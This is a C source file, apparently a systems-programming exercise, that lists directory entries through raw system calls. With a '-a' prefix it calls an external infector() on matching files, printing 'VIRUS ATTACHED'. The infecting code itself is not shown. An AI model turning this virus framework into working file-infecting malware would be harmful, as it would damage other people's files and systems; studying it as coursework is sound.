#include "util.h"
#define _GNU_SOURCE
#include <dirent.h>
#include <fcntl.h>
#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define SYS_SEEK 19
#define SEEK_SET 0
#define SYS_GETDENTS 141
#define SHIRA_OFFSET 0x291
#define BUF_SIZE 8192
void infection();
void infector(char *filepath);
extern int system_call();

struct linux_dirent
{
	unsigned long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

int main(int argc, char *argv[], char *envp[])
{
	int fd;
	long nread;
	char buf[BUF_SIZE];
	struct linux_dirent *d;
	char d_type;
	int i = 0;
	int attach = 0;
	char *fileAttach;
	while (i < argc)
	{
		if (strncmp(argv[i], "-a", 2) == 0)
		{
			attach = 1;
			fileAttach = argv[i] + 2;
		}
		i = i + 1;
	}
	fd = system_call(SYS_OPEN, ".", O_RDONLY | O_DIRECTORY, 0777);
	if (fd == -1)
	{
		system_call(SYS_WRITE, STDOUT, "error in open the file!!", strlen("error in open the file!!"));
		system_call(1, 0x55);
	}
	for (;;)
	{
		nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
		if (nread == -1)
		{
			system_call(SYS_WRITE, STDOUT, "getdents", strlen("getdents"));
			system_call(1, 0x55);
		}
		if (nread == 0)
		{
			system_call(1, 0x55);
		}
		long bpos = 0;
		while (bpos < nread)
		{
			d = (struct linux_dirent *)(buf + bpos);
			/*printf("%s\n", d->d_name);*/
			system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
			system_call(SYS_WRITE, STDOUT, " ", 1);
			if ((attach == 1 && strncmp(fileAttach, d->d_name, strlen(fileAttach)) != 0) || attach == 0)
			{
				system_call(SYS_WRITE, STDOUT, "\n", 1);
			}
			if (attach == 1)
			{
				if (strncmp(fileAttach, d->d_name, strlen(fileAttach)) == 0)
				{
					system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED", strlen("VIRUS ATTACHED"));
					system_call(SYS_WRITE, STDOUT, " ", 1);
					/*infection();*/
					system_call(SYS_WRITE, STDOUT, "\n", 1);
					infector(fileAttach);
				}
			}

			bpos += d->d_reclen;
		}
	}

	return 0;
}
